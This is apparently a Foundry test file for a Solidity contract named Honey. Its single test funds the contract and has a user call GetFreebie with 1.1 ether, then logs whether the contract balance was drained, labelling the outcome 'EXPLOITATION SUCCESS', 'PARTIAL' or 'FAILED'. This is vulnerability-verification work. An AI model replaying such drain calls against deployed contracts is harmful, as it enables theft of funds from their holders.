// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf.sol";

contract HoneyTest is Test {
    Honey internal honey;
    address internal constant OWNER = address(0x123);
    address internal constant USER = address(0x456);
    uint256 internal constant INITIAL_BALANCE = 10 ether;

    function setUp() public {
        // Deploy from owner address
        vm.prank(OWNER);
        honey = new Honey();

        // Fund contract balance
        vm.deal(address(honey), INITIAL_BALANCE);
    }

    function testGetFreebieDrainsContract() public {
        console.log("--- BEFORE-Trigger Balance ---");
        uint256 preBalance = address(honey).balance;
        console.log("Contract ETH Balance: %s", preBalance);
        
        console.log("--- Trigger GetFreebie ---");
        // User calls with enough ETH
        vm.deal(USER, 1.1 ether);
        vm.prank(USER);
        honey.GetFreebie{value: 1.1 ether}();
        
        console.log("--- AFTER-Trigger Balance ---");
        uint256 postBalance = address(honey).balance;
        console.log("Contract ETH Balance: %s", postBalance);
        
        // Validate state change and vulnerability
        console.log("--- Differential Result ---");
        if (postBalance == 0) {
            console.log("EXPLOITATION SUCCESS: Contract balance drained to 0");
            console.log("Vulnerability Exists: GetFreebie function allows draining contract balance");
        } else if (postBalance < preBalance) {
            console.log("EXPLOITATION PARTIAL: Contract balance reduced to %s", postBalance);
            console.log("Vulnerability Exists: Partial drain but contract balance modified");
        } else {
            console.log("EXPLOITATION FAILED: Contract balance unchanged");
            console.log("Vulnerability not Exist: Contract balance remains unchanged at %s", preBalance);
        }
    }
}